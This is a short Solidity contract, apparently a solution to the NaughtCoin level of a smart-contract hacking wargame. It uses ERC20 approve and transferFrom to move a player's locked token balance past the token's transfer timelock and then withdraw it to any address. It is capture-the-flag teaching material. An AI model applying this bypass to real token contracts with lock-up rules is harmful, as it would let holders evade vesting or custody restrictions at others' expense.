// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

/** 
    @title Hacker contract for NaughtCoin
    @notice First, an other account is approved to spend our funds. 
            Then, they can transfer the funds out of the player's balance without any timelock.
*/

contract HackNaughtCoin {
    ERC20 NaughtCoin = ERC20(0x3c5F9Fb050C74473740AC14ea5E59B69E592bfE2);
    uint balance = 1000000 * (10**18);

    function transfer() external {
        NaughtCoin.transferFrom(msg.sender, address(this), balance);
    }

    function withdrawal(address _to) external {
        NaughtCoin.transfer(_to, balance);
    }
}